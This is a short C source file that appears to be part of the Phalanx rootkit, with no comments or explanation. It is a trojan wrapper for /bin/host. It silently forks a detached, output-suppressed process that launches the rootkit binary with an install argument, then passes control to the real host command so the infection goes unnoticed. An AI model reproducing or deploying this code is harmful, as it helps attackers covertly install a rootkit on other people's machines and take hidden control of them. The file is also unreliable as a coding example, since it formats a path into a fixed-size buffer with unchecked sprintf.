#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include "conf.h"


int
main (int argc, char **argv, char **envp)
{
  char hostname[52];
  sprintf (hostname, "/bin/host%s", SUFFIX);
  if (fork () == 0)
    {
      if (fork () == 0)
	{
	  setsid ();
	  close (1);
	  close (2);
	  execl (PHALANX, "phalanx", "i", NULL);
	}
      exit (0);
    }

  execve (hostname, argv, envp);

}
